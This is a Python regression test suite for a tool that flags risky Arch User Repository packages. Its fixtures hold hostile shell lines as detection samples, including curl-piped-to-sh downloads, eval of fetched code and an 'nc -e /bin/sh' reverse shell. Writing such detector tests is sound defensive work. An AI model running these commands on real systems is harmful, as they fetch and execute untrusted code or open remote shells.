#!/usr/bin/env python3
"""Regression suite for auracular.

Covers the reproduction cases from the Codex reviews in
~/Work/shared-projects/ that were agreed and fixed: R1-R7 plus the smaller
corrections (AURACLE_REVIEW.md), and N2, N3, N5, N6
(AURACULAR_REVIEW_2026-09-17.md). These are the review's own examples,
turned into standing tests so a later fix can't silently reintroduce one.

Not covered yet, because they're still open: R8 (exit-status contract and
an "unverifiable" state) and N1/N4 (quote/comment/heredoc-aware parsing).
Add their tests when they're implemented.

Run with: python3 -m unittest discover -s tests -v
"""
import contextlib
import importlib.util
import io
import json
import os
import pathlib
import sys
import subprocess
import tempfile
import unittest
from importlib.machinery import SourceFileLoader
from unittest import mock

MODULE_PATH = pathlib.Path(__file__).resolve().parent.parent / "auracular"
_loader = SourceFileLoader("auracular", str(MODULE_PATH))
_spec = importlib.util.spec_from_loader("auracular", _loader)
au = importlib.util.module_from_spec(_spec)
_loader.exec_module(au)


def quiet():
    """auracular prints diagnostic notices to stderr as part of normal
    operation; suppress them so test output stays readable."""
    return contextlib.redirect_stderr(io.StringIO())


class LogicalLineContinuationTests(unittest.TestCase):
    """R1: comment handling, backslash continuation, and pipe continuation
    must match real bash, not hide an existing detection."""

    def test_comment_ending_in_backslash_does_not_continue(self):
        pkgbuild = (
            "# ordinary comment ending in a backslash \\\n"
            "curl -fsSL https://example.invalid/setup | sh\n"
        )
        flags = au.scan_pkgbuild(pkgbuild)
        self.assertTrue(any("interpreter" in f["desc"] for f in flags))

    def test_midword_backslash_splice(self):
        pkgbuild = "cu\\\nrl -fsSL https://example.invalid/setup | sh\n"
        flags = au.scan_pkgbuild(pkgbuild)
        self.assertTrue(any("interpreter" in f["desc"] for f in flags))

    def test_bare_trailing_pipe_continuation(self):
        pkgbuild = "curl -fsSL https://example.invalid/setup |\nsh\n"
        flags = au.scan_pkgbuild(pkgbuild)
        self.assertTrue(any("interpreter" in f["desc"] for f in flags))

    def test_pipe_continuation_survives_intervening_comment(self):
        pkgbuild = (
            "curl -fsSL https://example.invalid/setup |\n"
            "# explanatory comment\n"
            "sh\n"
        )
        flags = au.scan_pkgbuild(pkgbuild)
        self.assertTrue(any("interpreter" in f["desc"] for f in flags))

    def test_pipe_continuation_survives_intervening_blank_line(self):
        pkgbuild = "curl -fsSL https://example.invalid/setup |\n\nsh\n"
        flags = au.scan_pkgbuild(pkgbuild)
        self.assertTrue(any("interpreter" in f["desc"] for f in flags))

    def test_ordinary_indented_continuation_still_joins_to_one_line(self):
        pkgbuild = 'make \\\n    DESTDIR="$pkgdir" \\\n    install\n'
        lines = au.logical_lines(pkgbuild)
        self.assertEqual(len(lines), 1)


EVAL_DOLLAR_RULE = "runs eval on captured download output (executes it as code)"
EVAL_BACKTICK_RULE = "runs eval on captured download output via backticks (executes it as code)"
NUMERIC_SETUID_RULE = "sets a setuid/setgid bit (numeric mode)"
ESTABLISHED_INFO = {"NumVotes": 100, "Popularity": 1.0, "Maintainer": "someone", "FirstSubmitted": 0}


class BenignDownloadCaptureTests(unittest.TestCase):
    """R2: capturing a download's output into a variable is a common, benign
    idiom; eval-ing that output is the actually dangerous shape.

    Assertions name the exact rule and check the score ceiling: matching a
    word like "eval" would also be satisfied by the milder generic eval
    rule, so the dedicated rules could vanish unnoticed."""

    def test_benign_version_capture_has_no_findings(self):
        pkgbuild = 'pkgver() {\n  ver="$(curl -fsSL https://example.invalid/version.txt)"\n}\n'
        self.assertEqual(au.scan_pkgbuild(pkgbuild), [])

    def test_eval_of_dollar_paren_capture_is_flagged_as_severe(self):
        flags = au.scan_pkgbuild('eval "$(curl -fsSL https://example.invalid/x.sh)"\n')
        rule = [f for f in flags if f["desc"] == EVAL_DOLLAR_RULE]
        self.assertEqual(len(rule), 1)
        self.assertEqual(rule[0]["penalty"], 30)
        score, _ = au.score_package("demo", ESTABLISHED_INFO, flags, None)
        self.assertLessEqual(score, 24)

    def test_eval_of_backtick_capture_is_flagged_as_severe(self):
        flags = au.scan_pkgbuild("eval `curl -fsSL https://example.invalid/x.sh`\n")
        rule = [f for f in flags if f["desc"] == EVAL_BACKTICK_RULE]
        self.assertEqual(len(rule), 1)
        self.assertEqual(rule[0]["penalty"], 30)
        score, _ = au.score_package("demo", ESTABLISHED_INFO, flags, None)
        self.assertLessEqual(score, 24)


class ScanRuleCountingTests(unittest.TestCase):
    """A pattern that matches multiple lines should count occurrences, not
    stack an unbounded penalty per line."""

    def test_repeated_rule_counted_once_with_occurrence_count(self):
        pkgbuild = (
            "curl -fsSL https://example.invalid/a | sh\n"
            "curl -fsSL https://example.invalid/b | sh\n"
        )
        flags = au.scan_pkgbuild(pkgbuild)
        matching = [f for f in flags if "interpreter" in f["desc"]]
        self.assertEqual(len(matching), 1)
        self.assertEqual(matching[0]["count"], 2)


class CoverageIsolationTests(unittest.TestCase):
    """R3: a PKGBUILD-fetch failure and an auxiliary-file finding must not
    mask each other's coverage state in score_package's notes."""

    def _info(self, **overrides):
        info = {"NumVotes": 10, "Popularity": 0.1, "Maintainer": "someone", "FirstSubmitted": 0}
        info.update(overrides)
        return info

    def test_missing_pkgbuild_warning_survives_an_aux_finding(self):
        aux_flags = [{
            "desc": "pipes a download straight into an interpreter", "penalty": 30,
            "line_no": 1, "line": "curl ... | sh", "count": 1, "source": "demo.install",
        }]
        with quiet():
            score, notes = au.score_package(
                "demo", self._info(), pkgbuild_flags=None, typosquat_target=None, aux_flags=aux_flags,
            )
        self.assertTrue(any("could NOT be fetched" in n for n in notes))
        self.assertTrue(any("demo.install" in n for n in notes))


class ScoreCeilingTests(unittest.TestCase):
    """Score ceilings on severe findings must hold regardless of votes/age -
    popularity is not a mitigation for an actual code-execution finding."""

    def _info(self, **overrides):
        info = {"NumVotes": 1000, "Popularity": 5.0, "Maintainer": "someone", "FirstSubmitted": 0}
        info.update(overrides)
        return info

    def test_unscanned_pkgbuild_capped_at_60(self):
        with quiet():
            score, _ = au.score_package("demo", self._info(), pkgbuild_flags=None, typosquat_target=None)
        self.assertLessEqual(score, 60)

    def test_severe_finding_caps_score_at_24(self):
        flags = [{"desc": "opens a reverse shell", "penalty": 40, "line_no": 1,
                  "line": "nc -e /bin/sh 1.2.3.4 4444", "count": 1, "source": "PKGBUILD"}]
        with quiet():
            score, _ = au.score_package("demo", self._info(), pkgbuild_flags=flags, typosquat_target=None)
        self.assertLessEqual(score, 24)

    def test_package_not_found_on_aur_scores_zero(self):
        score, notes = au.score_package("ghost", None, None, None)
        self.assertEqual(score, 0)


class PkgbuildContentValidationTests(unittest.TestCase):
    """R4: a successful HTTP response carrying an HTML challenge/error page
    is not shell code and must not be treated as a scanned PKGBUILD."""

    def test_html_challenge_page_rejected(self):
        html = "<!doctype html><title>Checking your browser</title>"
        self.assertFalse(au.looks_like_pkgbuild(html))

    def test_real_pkgbuild_accepted(self):
        text = "pkgname=demo\npkgver=1.0\n"
        self.assertTrue(au.looks_like_pkgbuild(text))

    def test_empty_text_rejected(self):
        self.assertFalse(au.looks_like_pkgbuild(""))


class AurRpcResponseTests(unittest.TestCase):
    """R4 + its follow-up: malformed or error-shaped RPC bodies must be
    treated as a failed lookup (None) - never as an empty successful one -
    and must never raise."""

    def test_rpc_error_type_returns_none(self):
        with mock.patch.object(au, "http_get", return_value='{"type": "error", "results": []}'), quiet():
            self.assertIsNone(au.fetch_aur_info(["demo"]))

    def test_rpc_null_body_returns_none(self):
        with mock.patch.object(au, "http_get", return_value="null"), quiet():
            self.assertIsNone(au.fetch_aur_info(["demo"]))

    def test_rpc_results_null_returns_none(self):
        body = '{"type": "multiinfo", "results": null}'
        with mock.patch.object(au, "http_get", return_value=body), quiet():
            self.assertIsNone(au.fetch_aur_info(["demo"]))

    def test_rpc_results_wrong_type_returns_none(self):
        body = '{"type": "multiinfo", "results": 1}'
        with mock.patch.object(au, "http_get", return_value=body), quiet():
            self.assertIsNone(au.fetch_aur_info(["demo"]))

    def test_rpc_success_returns_dict_keyed_by_name(self):
        body = '{"type": "multiinfo", "results": [{"Name": "demo", "Version": "1.0"}]}'
        with mock.patch.object(au, "http_get", return_value=body), quiet():
            result = au.fetch_aur_info(["demo"])
        self.assertEqual(result["demo"]["Version"], "1.0")


class GitRepoTestCase(unittest.TestCase):
    """A throwaway local git repo standing in for an AUR package repo,
    cloned through a file:// URL so no network is involved."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.repo_dir = pathlib.Path(self.tmp.name) / "repo"
        self.repo_dir.mkdir()
        self.outside_marker = pathlib.Path(self.tmp.name) / "outside-secret.txt"
        self.outside_marker.write_text("outside contents\n")
        self._git("init", "-q", "-b", "master")
        self._git("config", "user.email", "test@example.invalid")
        self._git("config", "user.name", "Test")
        self._git("config", "commit.gpgSign", "false")
        self._git("config", "core.hooksPath", "/dev/null")

    def _git(self, *args, env=None):
        subprocess.run(["git", "-C", str(self.repo_dir), *args], check=True,
                        capture_output=True, text=True, env=env)

    def _commit_all(self, author=None, timestamp=None):
        env = None
        if timestamp is not None:
            env = dict(os.environ, GIT_AUTHOR_DATE=f"@{timestamp} +0000",
                       GIT_COMMITTER_DATE=f"@{timestamp} +0000")
        self._git("add", "-A")
        extra = ["--author", author] if author else []
        self._git("commit", "-q", "--allow-empty", "-m", "test commit", *extra, env=env)

    def _clone_and_scan(self, extra_files=()):
        # Clone next to outside_marker, so a "../outside-secret.txt" escape
        # would find a real file instead of passing because nothing's there.
        clone_dir = pathlib.Path(self.tmp.name) / "clone"
        clone_dir.mkdir()
        with mock.patch.object(au, "AUR_GIT_URL", self.repo_dir.as_uri()), \
                mock.patch.object(au.tempfile, "mkdtemp", return_value=str(clone_dir)):
            return au.fetch_commit_history("ignored", extra_files=extra_files)


class AuxFileContainmentTests(GitRepoTestCase):
    """R5: auxiliary-file collection must not follow symlinks outside the
    clone, must cap file size, and must key by relative path so same-named
    files in different subdirectories don't collide into one entry."""

    def test_symlink_outside_clone_is_not_read(self):
        (self.repo_dir / "pwn.install").symlink_to(self.outside_marker)
        self._commit_all()
        commits, aux_files = self._clone_and_scan()
        self.assertIsNotNone(commits, "git clone unexpectedly failed")
        self.assertNotIn("outside contents", "".join(aux_files.values()))

    def test_oversized_file_is_skipped(self):
        (self.repo_dir / "big.install").write_bytes(b"a" * 1_100_000)
        self._commit_all()
        commits, aux_files = self._clone_and_scan()
        self.assertIsNotNone(commits, "git clone unexpectedly failed")
        self.assertNotIn("big.install", aux_files)

    def test_same_filename_in_different_subdirs_both_kept(self):
        (self.repo_dir / "sub1").mkdir()
        (self.repo_dir / "sub2").mkdir()
        (self.repo_dir / "sub1" / "shared.install").write_text("one\n")
        (self.repo_dir / "sub2" / "shared.install").write_text("two\n")
        self._commit_all()
        commits, aux_files = self._clone_and_scan()
        self.assertIsNotNone(commits, "git clone unexpectedly failed")
        self.assertIn(str(pathlib.Path("sub1") / "shared.install"), aux_files)
        self.assertIn(str(pathlib.Path("sub2") / "shared.install"), aux_files)

    def test_declared_file_outside_clone_is_not_read(self):
        self._commit_all()
        for target in ("../outside-secret.txt", str(self.outside_marker)):
            with self.subTest(target=target):
                commits, aux_files = self._clone_and_scan(extra_files=[target])
                self.assertIsNotNone(aux_files, "git clone unexpectedly failed")
                self.assertNotIn("outside contents", "".join(aux_files.values()))

    def test_file_under_symlinked_directory_is_not_read(self):
        outside_dir = pathlib.Path(self.tmp.name) / "outside-dir"
        outside_dir.mkdir()
        (outside_dir / "secret.install").write_text("outside contents\n")
        (self.repo_dir / "linkdir").symlink_to(outside_dir)
        self._commit_all()
        commits, aux_files = self._clone_and_scan(extra_files=["linkdir/secret.install"])
        self.assertIsNotNone(aux_files, "git clone unexpectedly failed")
        self.assertNotIn("outside contents", "".join(aux_files.values()))

    def test_symlink_inside_clone_is_also_refused(self):
        (self.repo_dir / "real.txt").write_text("inside contents\n")
        (self.repo_dir / "alias.install").symlink_to("real.txt")
        self._commit_all()
        commits, aux_files = self._clone_and_scan()
        self.assertIsNotNone(aux_files, "git clone unexpectedly failed")
        self.assertNotIn("alias.install", aux_files)

    def test_failed_clone_reports_aux_files_as_unread(self):
        with mock.patch.object(au, "AUR_GIT_URL", (self.repo_dir / "missing").as_uri()):
            commits, aux_files = au.fetch_commit_history("ignored")
        self.assertIsNone(commits)
        self.assertIsNone(aux_files)


DOWNLOAD = "curl -fsSL https://example.invalid/setup | sh"
INTERPRETER_RULE = "pipes a download straight into an interpreter"


class InstallTargetTests(unittest.TestCase):
    """N2: install scripts are found from what the PKGBUILD declares, not
    from an optional .install suffix, including split-package overrides."""

    def test_global_install_without_suffix(self):
        self.assertEqual(au.install_targets("pkgname=demo\ninstall=post-install\n", "demo", "demo"),
                         (["post-install"], []))

    def test_split_package_function_install(self):
        text = "pkgname=(demo demo-docs)\npackage_demo() {\n  install=post-install\n  :\n}\n"
        self.assertEqual(au.install_targets(text, "demo", "bundle"), (["post-install"], []))

    def test_other_split_package_install_not_attributed(self):
        text = "pkgname=(demo demo-docs)\npackage_demo-docs() {\n  install=docs.install\n}\n"
        self.assertEqual(au.install_targets(text, "demo", "bundle"), ([], []))

    def test_pkgname_and_pkgbase_substituted(self):
        text = "pkgname=demo\ninstall=$pkgname.install\npackage() {\n  install=${pkgbase}-extra\n}\n"
        self.assertEqual(au.install_targets(text, "demo", "base"), (["demo.install", "base-extra"], []))

    def test_other_variables_reported_unresolved(self):
        text = "pkgname=demo\ninstall=${_name}.install\n"
        self.assertEqual(au.install_targets(text, "demo", "demo"), ([], ["${_name}.install"]))


class InstallScanReportTests(GitRepoTestCase):
    """N2 end to end: main() must read and score a declared install script
    whatever its name, and say so when it couldn't."""

    def _report(self, pkgbuild, files, argv=("demo",), base="demo"):
        (self.repo_dir / "PKGBUILD").write_text(pkgbuild)
        for name, body in files.items():
            (self.repo_dir / name).write_text(body)
        self._commit_all()
        info = dict(ESTABLISHED_INFO, Name="demo", PackageBase=base)
        out = io.StringIO()
        with contextlib.ExitStack() as stack:
            stack.enter_context(mock.patch.object(au, "AUR_GIT_URL", self.repo_dir.as_uri()))
            stack.enter_context(mock.patch.object(au, "fetch_aur_info", return_value={"demo": info}))
            stack.enter_context(mock.patch.object(au, "fetch_pkgbuild", return_value=pkgbuild))
            stack.enter_context(mock.patch.object(au, "official_repo_names", return_value=set()))
            stack.enter_context(mock.patch.object(sys, "argv", ["auracular", *argv]))
            stack.enter_context(contextlib.redirect_stdout(out))
            stack.enter_context(quiet())
            au.main()
        return out.getvalue()

    def test_extensionless_install_script_is_scanned(self):
        report = self._report("pkgname=demo\ninstall=post-install\npackage() { :; }\n",
                              {"post-install": f"post_install() {{\n  {DOWNLOAD}\n}}\n"})
        self.assertIn(f"post-install: {INTERPRETER_RULE}", report)
        self.assertIn("HIGH RISK", report)

    def test_split_package_install_script_is_scanned(self):
        pkgbuild = ("pkgbase=bundle\npkgname=(demo demo-docs)\n"
                    "package_demo() {\n  install=post-install\n  :\n}\npackage_demo-docs() { :; }\n")
        report = self._report(pkgbuild, {"post-install": f"post_install() {{\n  {DOWNLOAD}\n}}\n"},
                              base="bundle")
        self.assertIn(f"post-install: {INTERPRETER_RULE}", report)
        self.assertIn("HIGH RISK", report)

    def test_read_clean_install_script_gets_no_unread_warning(self):
        report = self._report("pkgname=demo\ninstall=demo.install\npackage() { :; }\n",
                              {"demo.install": "post_install() {\n  echo hello\n}\n"})
        self.assertNotIn("sets install=", report)
        self.assertIn("LOW RISK", report)

    def test_missing_install_script_is_reported_unread(self):
        report = self._report("pkgname=demo\ninstall=post-install\npackage() { :; }\n", {})
        self.assertIn("sets install=post-install", report)
        self.assertIn("could not read its contents", report)

    def test_no_history_reports_install_script_unread(self):
        report = self._report("pkgname=demo\ninstall=post-install\npackage() { :; }\n",
                              {"post-install": f"post_install() {{\n  {DOWNLOAD}\n}}\n"},
                              argv=("--no-history", "demo"))
        self.assertIn("could not read its contents", report)
        self.assertIn("auxiliary/.install file scanning did not run", report)


class GitLogParsingTests(GitRepoTestCase):
    """N3: an author name containing the old "|" delimiter must not make a
    commit disappear from history analysis."""

    def _history(self, new_author):
        base_ts = 1_700_000_000
        (self.repo_dir / "PKGBUILD").write_text("pkgname=demo\n")
        self._commit_all(author="Alice Original <alice@old.example>", timestamp=base_ts)
        self._commit_all(author=new_author, timestamp=base_ts + 399 * 86400)
        commits, _ = self._clone_and_scan()
        self.assertIsNotNone(commits, "history unexpectedly unavailable")
        return commits

    def test_pipe_in_author_name_keeps_commit(self):
        commits = self._history("Bob | Newcomer <bob@new.example>")
        self.assertEqual([c[1] for c in commits], ["Alice Original", "Bob | Newcomer"])
        handoff = au.analyze_maintainer_history(commits)
        self.assertIsNotNone(handoff)
        self.assertEqual(handoff["gap_days"], 399)

    def test_malformed_record_marks_history_incomplete(self):
        commits, complete = au.parse_git_log("a@x\x00A\x001\nbroken record\n")
        self.assertEqual(commits, [("a@x", "A", 1)])
        self.assertFalse(complete)


class RpcRowValidationTests(unittest.TestCase):
    """N5: a success-shaped RPC body with a malformed row must be treated as
    an unavailable lookup, not crash later or become "not found"."""

    def _lookup(self, row):
        body = json.dumps({"type": "multiinfo", "results": [row]})
        with mock.patch.object(au, "http_get", return_value=body), quiet():
            return au.fetch_aur_info(["demo"])

    def test_malformed_rows_return_none(self):
        bad_rows = [
            {"Name": []},
            {"Version": "1"},
            {"Name": "demo", "NumVotes": "12"},
            {"Name": "demo", "NumVotes": True},
            {"Name": "demo", "Popularity": "high"},
            {"Name": "demo", "FirstSubmitted": 10**20},
            {"Name": "demo", "OutOfDate": -1},
            {"Name": "demo", "Maintainer": 5},
            "not a dict",
        ]
        for row in bad_rows:
            with self.subTest(row=row):
                self.assertIsNone(self._lookup(row))

    def test_null_optional_fields_are_accepted_and_scorable(self):
        row = {"Name": "demo", "NumVotes": 3, "Popularity": 0.1, "Maintainer": None,
               "FirstSubmitted": 1_600_000_000, "OutOfDate": None, "PackageBase": "demo"}
        result = self._lookup(row)
        self.assertEqual(result, {"demo": row})
        score, _ = au.score_package("demo", result["demo"], [], None)
        self.assertIsInstance(score, int)


class ExtractorTests(unittest.TestCase):
    """R6 across both review rounds: extract_scalar/extract_array/
    extract_function_body must match the real declaration, not a look-alike
    substring or a commented-out placeholder."""

    def test_depends_not_matched_inside_makedepends(self):
        text = "makedepends=(cmake)\ndepends=(glibc)\n"
        self.assertEqual(au.extract_array(text, "depends"), ["glibc"])

    def test_quoted_brace_does_not_truncate_function_body(self):
        text = 'package() {\n  printf "}"\n  echo done\n}\n'
        body = au.extract_function_body(text, "package")
        self.assertIn("echo done", body)

    def test_split_package_function_found_by_qualified_name(self):
        text = "package_demo() {\n  echo hi\n}\n"
        self.assertIsNone(au.extract_function_body(text, "package"))
        self.assertIsNotNone(au.extract_function_body(text, "package_demo"))

    def test_explain_report_falls_back_to_split_package_function(self):
        text = "pkgname=(demo)\npackage_demo() {\n  echo hi\n}\n"
        info = {"Description": "x", "Version": "1", "Maintainer": "m", "URL": "u",
                "NumVotes": 0, "Popularity": 0.0}
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            au.print_explain_report("demo", info, text)
        self.assertIn("package_demo()", buf.getvalue())

    def test_unresolved_variable_source_is_not_called_local(self):
        host, label = au.source_host("${_url}/archive.tar.gz")
        self.assertIsNone(host)
        self.assertIn("can't be statically resolved", label)

    def test_variable_ipv6_host_is_unresolved_not_a_crash(self):
        host, label = au.source_host("https://[${_ipv6}]/archive.tar.gz")
        self.assertIsNone(host)
        self.assertIn("can't be statically resolved", label)

    def test_malformed_literal_url_is_not_a_crash(self):
        host, label = au.source_host("https://[not-an-address]/archive.tar.gz")
        self.assertIsNone(host)
        self.assertIn("malformed", label)

    def test_variable_in_host_is_unresolved(self):
        host, label = au.source_host("https://${_mirror}/archive.tar.gz")
        self.assertIsNone(host)
        self.assertIn("can't be statically resolved", label)

    def test_plain_local_file_source_is_called_local(self):
        host, label = au.source_host("local-patch.diff")
        self.assertIsNone(host)
        self.assertIn("local file bundled", label)

    def test_commented_out_function_does_not_shadow_real_one(self):
        text = "# package() { printf placeholder; }\npkgname=demo\npackage() {\n  printf actual\n}\n"
        body = au.extract_function_body(text, "package")
        self.assertIn("actual", body)
        self.assertNotIn("placeholder", body)

    def test_commented_out_scalar_does_not_override_real_value(self):
        text = "# install=old.install\ninstall=new.install\n"
        self.assertEqual(au.extract_scalar(text, "install"), "new.install")


class SanitizeTests(unittest.TestCase):
    """R7 across both review rounds: strip every control character that
    could hide or rewrite terminal output, while leaving tab/newline alone."""

    def test_strips_carriage_return(self):
        self.assertEqual(au.sanitize("before\rafter"), "beforeafter")

    def test_strips_c1_control_block(self):
        self.assertEqual(au.sanitize("2Jafter"), "2Jafter")

    def test_strips_esc(self):
        self.assertEqual(au.sanitize("\x1b[2Jafter"), "[2Jafter")

    def test_preserves_tab_and_newline(self):
        self.assertEqual(au.sanitize("a\tb\nc"), "a\tb\nc")

    def test_none_passes_through_unchanged(self):
        self.assertIsNone(au.sanitize(None))


class SetuidNumericModeTests(unittest.TestCase):
    """Smaller correction: the numeric setuid/setgid class must cover all of
    2-7 (it originally skipped 3 and 5)."""

    def test_5755_is_detected(self):
        flags = au.scan_pkgbuild("chmod 5755 /usr/bin/demo\n")
        self.assertIn(NUMERIC_SETUID_RULE, [f["desc"] for f in flags])

    def test_3755_is_detected(self):
        flags = au.scan_pkgbuild("chmod 3755 /usr/bin/demo\n")
        self.assertIn(NUMERIC_SETUID_RULE, [f["desc"] for f in flags])

    def test_ordinary_0755_has_no_findings(self):
        self.assertEqual(au.scan_pkgbuild("chmod 0755 /usr/bin/demo\n"), [])


class MaintainerHandoffTests(unittest.TestCase):
    """Deterministic history-based dormancy/handoff detection, using fixed
    timestamps so results don't depend on when the suite runs."""

    DAY = 86400

    def test_long_dormancy_then_new_maintainer_is_flagged(self):
        # Distinct domains and dissimilar names so identity_similar treats
        # these as two different people, not a cosmetic git-config change.
        commits = [
            ("alice@old-maintainer.example", "Alice Original", 1_000_000),
            ("bob@new-owner.example", "Bob Newcomer", 1_000_000 + 200 * self.DAY),
            ("bob@new-owner.example", "Bob Newcomer", 1_000_000 + 201 * self.DAY),
        ]
        handoff = au.analyze_maintainer_history(commits)
        self.assertIsNotNone(handoff)
        self.assertEqual(handoff["gap_days"], 200)

    def test_short_gap_between_commits_is_not_a_handoff(self):
        # Distinct identities (so this exercises the dormancy-threshold
        # check itself, not identity merging), but only a 10-day gap - well
        # under DORMANCY_THRESHOLD_DAYS.
        commits = [
            ("alice@old-maintainer.example", "Alice Original", 1_000_000),
            ("bob@new-owner.example", "Bob Newcomer", 1_000_000 + 10 * self.DAY),
        ]
        self.assertIsNone(au.analyze_maintainer_history(commits))

    def test_single_maintainer_has_no_handoff(self):
        commits = [
            ("a@example.invalid", "A", 1_000_000),
            ("a@example.invalid", "A", 1_000_000 + 300 * self.DAY),
        ]
        self.assertIsNone(au.analyze_maintainer_history(commits))


if __name__ == "__main__":
    unittest.main()
